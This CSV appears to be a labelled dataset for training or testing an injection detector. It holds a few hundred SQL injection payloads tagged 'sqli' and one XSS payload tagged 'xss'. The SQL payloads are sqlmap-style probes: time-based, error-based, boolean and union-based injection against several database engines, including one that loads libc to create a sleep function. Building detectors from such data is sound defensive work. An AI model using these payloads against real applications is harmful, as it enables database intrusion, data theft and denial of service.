"pattern","type"
"1) as nfgb where 2503=2503 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--","sqli"
"-2125"")) or 8571=8571--","sqli"
">""<img src=""mocha:document.cookie=true;"">","xss"
"1"" and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ""xwnw""=""xwnw","sqli"
"1' (select ukwc where 3008=3008 or (select * from (select(sleep(5)))sddo)#","sqli"
"1 where 1656=1656 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1%"")) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((""%""=""","sqli"
"1""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""wvyb""=""wvyb","sqli"
"1) where 3565=3565 and 6969=(select 6969 from pg_sleep(5))--","sqli"
"-6310 or 6715=3399","sqli"
"1')));select pg_sleep(5) and ((('mgbm' like 'mgbm","sqli"
"1')));begin dbms_lock.sleep(5); end and ((('nhub'='nhub","sqli"
"1%')) and 4241=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (4241=4241) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and (('%'='","sqli"
"1"") and 4760=2922","sqli"
"1) or 6793=(select 6793 from pg_sleep(5))","sqli"
"1 where 7522=7522 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--","sqli"
"1 where 6965=6965 and elt(3933=1232,1232)--","sqli"
"1,(select (case when (5141=5141) then (ascii(regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))) else 5141/(select 0 from (values(0))) end) from (values(0)))","sqli"
"1%') or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ('%'='","sqli"
"1%'))) waitfor delay '0:0:5' and ((('%'='","sqli"
"1') as bagi where 1281=1281 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)--","sqli"
"1%"" procedure analyse(extractvalue(9627,concat(0x5c,(benchmark(5000000,md5(0x4b774c75))))),1)#","sqli"
"1'))) and make_set(8403=8403,8899) and ((('llfp'='llfp","sqli"
"1"") as jask where 7629=7629 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--","sqli"
"1' in boolean mode) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))#","sqli"
"1' and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"-7209'))) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and ((('stqx'='stqx","sqli"
"1"" where 3221=3221 or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666)--","sqli"
"1"") as obbk where 6414=6414 and (select 9067 from(select count(*),concat(0x7171706a71,(select (elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--","sqli"
"1' and elt(1210=1210,sleep(5)) and 'yhpp' like 'yhpp","sqli"
"1"");select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--","sqli"
"1') rlike (select * from (select(sleep(5)))sgvo) and ('zqiw'='zqiw","sqli"
"-3856"") as iyzl where 7394=7394 or 1570=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (1570=1570) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113)))--","sqli"
"-6803"") order by 1#","sqli"
"1%"" or 8156=(select count(*) from generate_series(1,5000000))--","sqli"
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('esma' like 'esma","sqli"
"1') and 4822=6997 and ('ojku'='ojku","sqli"
"1')) and make_set(8403=8403,8899) and (('lokx' like 'lokx","sqli"
"1' where 8231=8231;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--","sqli"
"1))) and (3020=3020)*6703 and (((1233=1233","sqli"
"1' (select rqcw where 9002=9002 union all select null,null,null,null,null,null,null,null,null#","sqli"
"1) as eryo where 2531=2531 rlike sleep(5)--","sqli"
"1' (select 'qbdh' where 4006=4006 and 7533=7533) '","sqli"
"-3505"") where 2340=2340 or 9323=9323#","sqli"
"1""));select sleep(5) and ((""twed"" like ""twed","sqli"
"1') union all select null,null--","sqli"
"-3748' where 9292=9292 or 3337=2859#","sqli"
"-9050 union all select 9346,9346,9346,9346,9346,9346,9346,9346,9346,9346--","sqli"
"1'))) union all select null,null--","sqli"
"-1123'))) union all select 6735,6735,6735,6735,6735,6735,6735,6735#","sqli"
"1')));select (case when (6166=3364) then 6166 else cast(1 as int)/(select 0 from dual) end) from dual--","sqli"
"1') as dwgv where 1525=1525 union all select null,null--","sqli"
"1') where 1502=1502 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)--","sqli"
"(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)","sqli"
"1' where 5035=5035 and 8594=(select 8594 from pg_sleep(5))--","sqli"
"1) where 7588=7588 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","sqli"
"1%') and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--","sqli"
"-9711' (select 'ckpj' where 8338=8338 union all select 8338--","sqli"
"1"" where 2072=2072 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--","sqli"
"1"")) and make_set(8403=8403,8899) and ((""nsyl""=""nsyl","sqli"
"1"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (""gzhp""=""gzhp","sqli"
"1))) or elt(5873=5873,sleep(5))#","sqli"
"1""))) and 4967=8866 and (((""jzyn"" like ""jzyn","sqli"
"1'||(select 'aioq' from dual where 8176=8176;begin user_lock.sleep(5); end--","sqli"
"-2374) or 2724 in ((char(113) char(113) char(112) char(106) char(113) (select (case when (2724=2724) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113))) and (2576=2576","sqli"
"1') as gogu where 4338=4338 union all select null#","sqli"
"1'))) and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and ((('vpus'='vpus","sqli"
"1'))) and make_set(8403=8403,8899) and ((('oacz'='oacz","sqli"
"-9553)) or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((5299=5299","sqli"
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)","sqli"
"-9698) as pvhn where 3223=3223 or elt(6563=9210,9210)--","sqli"
"1"" procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ""acbq"" like ""acbq","sqli"
"1' (select 'mxlb' where 4900=4900;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)) '","sqli"
"-2207%')) union all select 3339,3339,3339,3339,3339,3339#","sqli"
"1"" union all select null,null,null,null,null,null--","sqli"
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""pawh""=""pawh","sqli"
"1 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))-- viti","sqli"
"1) as rnfb where 2405=2405 or 8514=benchmark(5000000,md5(0x544d5a4c))#","sqli"
"1%"";select like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""%""=""","sqli"
"1) where 5048=5048 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","sqli"
"1'))) and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ((('tzrd'='tzrd","sqli"
"1"" where 2204=2204 and 3715 in ((char(113) char(113) char(112) char(106) char(113) (select (case when (3715=3715) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113)))--","sqli"
"-6764') or 2314=2017--","sqli"
"1'));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and (('btnl'='btnl","sqli"
"-3100') or 4144=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4144=4144) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ('etuj' like 'etuj","sqli"
"-9556') where 2472=2472 or (2883=9968)*9968--","sqli"
"1';select (case when (1014=4280) then 1014 else 1014*(select 1014 from mysql.db) end)#","sqli"
"1) and 6969=(select 6969 from pg_sleep(5)) and (9505=9505","sqli"
"-1263"") or 9323=9323#","sqli"
"1%"")) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"-3031"" union all select 2681#","sqli"
"-6377'||(select 'ryin' where 2113=2113 union all select 2113,2113,2113#","sqli"
"1"") where 2473=2473 and make_set(6118=7684,7684)--","sqli"
"1' (select 'kicv' where 1976=1976 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual)) '","sqli"
"-8410'))) or 8571=8571--","sqli"
"1' in boolean mode);select pg_sleep(5)--","sqli"
"1)));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--","sqli"
"1));select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#","sqli"
"1"") where 2873=2873 or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--","sqli"
"1"")));select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and (((""mofa"" like ""mofa","sqli"
"1%"")) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((""%""=""","sqli"
"1) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))","sqli"
"-6948"")) as ojjl where 1300=1300 or 6872=6872--","sqli"
"1' (select 'drqj' where 1246=1246;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--","sqli"
"1';call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)","sqli"
"-3462')) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and (('cxku' like 'cxku","sqli"
"1' in boolean mode) or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)#","sqli"
"1));begin user_lock.sleep(5); end--","sqli"
"1' (select 'yyyn' where 5395=5395;select (case when (8663=7467) then 8663 else 1/(select 0) end)--","sqli"
"-3458') where 2053=2053 or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--","sqli"
"-5217'||(select 'juen' from dual where 7336=7336 union all select 7336,7336,7336--","sqli"
"1 where 6434=6434;select benchmark(5000000,md5(0x4c4d6142))--","sqli"
"1' union all select null,null,null,null,null#","sqli"
"1"") where 1024=1024 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"1) and 3824=benchmark(5000000,md5(0x76555642))","sqli"
"1"") where 5828=5828 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"1%"") and 8407=(select count(*) from generate_series(1,5000000)) and (""%""=""","sqli"
"-9178 where 2253=2253 union all select 2253,2253,2253,2253,2253,2253,2253,2253#","sqli"
"-8809'||(select 'hyzr' where 5694=5694 union all select 5694--","sqli"
"1"");select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--","sqli"
"1"") where 6367=6367 union all select null,null,null,null,null,null,null#","sqli"
"1%'));waitfor delay '0:0:5' and (('%'='","sqli"
"1' (select 'yfrs' where 4388=4388 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"1%"" and sleep(5)#","sqli"
"1"") and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (""wfwg"" like ""wfwg","sqli"
"1'||(select 'bvic' from dual where 4839=4839 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5))||'","sqli"
"1') as nvqk where 3917=3917 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--","sqli"
"1"" or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))","sqli"
"1' in boolean mode);select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--","sqli"
"-7971' union all select 4273#","sqli"
"1) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)","sqli"
"1"" and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--","sqli"
"1"")));waitfor delay '0:0:5' and (((""mfro"" like ""mfro","sqli"
"-8793' where 3853=3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#","sqli"
"1%"" union all select null,null,null#","sqli"
"1';select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--","sqli"
"-9152"")) as avga where 3825=3825 order by 1#","sqli"
"1'||(select 'pygt' from dual where 5543=5543 union all select null,null,null,null,null,null#","sqli"
"1' (select 'zgtu' where 8419=8419;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--","sqli"
"1' (select uzan where 4312=4312 and make_set(3129=9555,9555)) '","sqli"
"-6215') or (8459=8459)*4906","sqli"
"1"")) union all select null,null,null,null,null,null,null,null,null#","sqli"
"-3862)) as vqtl where 9629=9629 union all select 9629,9629,9629,9629,9629--","sqli"
"-5500') order by 1--","sqli"
"1') as ncou where 9166=9166 and (select * from (select(sleep(5)))fzno)--","sqli"
"1"" rlike (select (case when (7689=7689) then 1 else 0x28 end))","sqli"
"1%"" union all select null,null,null,null--","sqli"
"1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'iuao'='iuao","sqli"
"1) as mnyy where 4409=4409 union all select null,null,null,null--","sqli"
"1' union all select null,null,null,null,null,null#","sqli"
"-7350'))) union all select 9207,9207,9207,9207--","sqli"
"1' where 4701=4701 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)--","sqli"
"1""))) or (select * from (select(sleep(5)))ydpu) and (((""djwo""=""djwo","sqli"
"1')) as bwjl where 8538=8538 union all select null,null,null,null,null,null,null#","sqli"
"1' (select 'hjku' where 1954=1954 and (select * from (select(sleep(5)))fzno)) '","sqli"
"1"") and make_set(8403=8403,8899) and (""akha"" like ""akha","sqli"
"1)));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1' in boolean mode);select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#","sqli"
"1%'))) and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x) and ((('%'='","sqli"
"-1940 or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)","sqli"
"1"" where 5039=5039 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"-4705' where 2029=2029 union all select 2029,2029,2029#","sqli"
"1';(select * from (select(sleep(5)))srmq) and 'fdgq'='fdgq","sqli"
"-3460%""))) or 9323=9323#","sqli"
"-3498"")) as xbvb where 2056=2056 union all select 2056,2056,2056,2056,2056,2056,2056--","sqli"
"1%' and 1736=4220","sqli"
"1"")) as nejd where 2885=2885;select like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"1,(cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (7823=7823) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric))","sqli"
"1')) or elt(5873=5873,sleep(5))#","sqli"
"1"") where 7753=7753;select pg_sleep(5)--","sqli"
"1%'))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--","sqli"
"1') and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)","sqli"
"1 where 8180=8180 or sleep(5)#","sqli"
"-2626%') or elt(7513=8586,8586) and ('%'='","sqli"
"1"") and (5452=6050)*6050 and (""ciyc"" like ""ciyc","sqli"
"1') where 4298=4298;(select * from (select(sleep(5)))acdk)#","sqli"
"-7564') as nank where 8095=8095 union all select 8095,8095,8095--","sqli"
"1'||(select 'uedk' where 4655=4655;waitfor delay '0:0:5')||'","sqli"
"1) where 7600=7600 union all select null,null,null,null,null,null--","sqli"
"1"") where 7914=7914 rlike (select * from (select(sleep(5)))vwyq)#","sqli"
"1%"") and 8626=3626#","sqli"
"1')) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('guxv'='guxv","sqli"
"1'||(select 'ativ' from dual where 4746=4746 union all select null,null,null,null#","sqli"
"1)) and 3228=7376#","sqli"
"1') where 6440=6440 or (select * from (select(sleep(5)))sddo)#","sqli"
"1"") and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--","sqli"
"1"") where 4739=4739 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--","sqli"
"1)) as gygm where 4024=4024;select like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"1%""))) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and (((""%""=""","sqli"
"1) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)","sqli"
"1 where 7240=7240 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"1' where 7353=7353 or 8156=(select count(*) from generate_series(1,5000000))--","sqli"
"1') or 8315=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ('amjh'='amjh","sqli"
"1""))) rlike (select * from (select(sleep(5)))sgvo) and (((""sdps""=""sdps","sqli"
"1');select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ('cxjp'='cxjp","sqli"
"1%"" and elt(4249=4249,7259) and ""%""=""","sqli"
"-8429'))) or make_set(9354=9354,7185) and ((('bwih' like 'bwih","sqli"
"-4589"") union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--","sqli"
"1') or 6793=(select 6793 from pg_sleep(5)) and ('fupe'='fupe","sqli"
"1"" and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ""hcjz"" like ""hcjz","sqli"
"-4176' (select 'muio' where 4256=4256 union all select 4256,4256,4256,4256,4256,4256#","sqli"
"-8364') union all select 4732,4732,4732,4732,4732,4732,4732,4732,4732#","sqli"
"-4983%"") or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (""%""=""","sqli"
"1%""))) union all select null,null,null,null,null,null,null,null,null,null#","sqli"
"1')) and 2401=4693 and (('ssrm'='ssrm","sqli"
"-1807')) union all select 9853,9853,9853,9853,9853,9853#","sqli"
"1"")) or (select * from (select(sleep(5)))ydpu) and ((""imlq"" like ""imlq","sqli"
"1'))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and ((('aduc'='aduc","sqli"
"1%""))) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (((""%""=""","sqli"
"1)) as gxvp where 3865=3865;select (case when (8716=1338) then 1 else 8716*(select 8716 from master..sysdatabases) end)--","sqli"
"1))) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and (((2197=2197","sqli"
"-8971'||(select 'smyx' where 7970=7970 union all select 7970,7970,7970,7970,7970,7970,7970#","sqli"
"1))) union all select null,null#","sqli"
"-8966%' or (7475=4014)*4014 and '%'='","sqli"
"1);call regexp_substring(repeat(right(char(2385),0),500000000),null)--","sqli"
"1)) as eveb where 7567=7567;if(5316=4416) select 5316 else drop function vtve--","sqli"
"-9024) where 1686=1686 or 3069=8213--","sqli"
"-8414%"") union all select 2795#","sqli"
"1' and make_set(8403=8403,8899) and 'fttd' like 'fttd","sqli"
"-1823 where 6852=6852 union all select 6852,6852,6852,6852,6852,6852#","sqli"
"-1681%"" union all select 8180,8180,8180,8180,8180,8180,8180,8180,8180,8180#","sqli"
"-7815' union all select 2638,2638,2638,2638,2638--","sqli"
"1' (select 'vjoj' where 5348=5348;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--","sqli"
"1"" rlike (select * from (select(sleep(5)))sgvo) and ""cxsu"" like ""cxsu","sqli"
"1%')) union all select null,null,null,null--","sqli"
"1')) and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and (('hbwk' like 'hbwk","sqli"
"1)));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((6051=6051","sqli"
"1' in boolean mode)(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0)))#","sqli"
"-6595"" order by 1--","sqli"
"-5528') union all select 5153,5153,5153,5153,5153,5153,5153,5153,5153#","sqli"
"1' in boolean mode) rlike (select (case when (7689=7689) then 1 else 0x28 end))#","sqli"
"1' or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))","sqli"
"-5595"")) as xttj where 4562=4562 union all select 4562,4562,4562,4562,4562#","sqli"
"1)) as nlzg where 1482=1482 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--","sqli"
"1%';begin user_lock.sleep(5); end--","sqli"
"1%"") or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and (""%""=""","sqli"
"-8327 where 7555=7555 or 1570=convert(int,(select char(113) char(113) char(112) char(106) char(113) (select (case when (1570=1570) then char(49) else char(48) end)) char(113) char(122) char(118) char(122) char(113)))--","sqli"
"-9352""))) or 3038=3038","sqli"
"1"" or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)","sqli"
"1') as ihsc where 3978=3978;begin user_lock.sleep(5); end--","sqli"
"1%') and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--","sqli"
"1%'))) and (9404=8390)*8390 and ((('%'='","sqli"
"1') where 8142=8142 waitfor delay '0:0:5'--","sqli"
"1 where 7051=7051 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"1"" and 3202=like('abcdefg',upper(hex(randomblob(500000000/2)))) and ""fqeu"" like ""fqeu","sqli"
"1%';begin dbms_lock.sleep(5); end--","sqli"
"1%"")) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--","sqli"
"1%""))) waitfor delay '0:0:5' and (((""%""=""","sqli"
"1')) as zari where 6847=6847;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--","sqli"
"1') as zxho where 5907=5907 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--","sqli"
"1) as jvmv where 3857=3857 and (5717=6483)*6483--","sqli"
"1')) as stnn where 6160=6160 and 8881=7347--","sqli"
"1' or (select * from (select(sleep(5)))sddo)#","sqli"
"1"" where 4991=4991 or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--","sqli"
"1')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('uadr' like 'uadr","sqli"
"1)) as smtf where 5829=5829;select (case when (2350=8682) then 2350 else 1/(select 0) end)--","sqli"
"1"")));select like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""ksip"" like ""ksip","sqli"
"1"");select sleep(5)#","sqli"
"1"")) as isqj where 6344=6344 union all select null,null,null,null--","sqli"
"1'||(select 'abjv' from dual where 4200=4200;begin dbms_lock.sleep(5); end)||'","sqli"
"1%') union all select null,null,null,null,null,null,null,null,null,null--","sqli"
"1' (select 'usoq' where 7783=7783 and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161)) '","sqli"
"1')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5)--","sqli"
"1');call regexp_substring(repeat(right(char(2385),0),500000000),null)--","sqli"
"-1796') or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('lpuw' like 'lpuw","sqli"
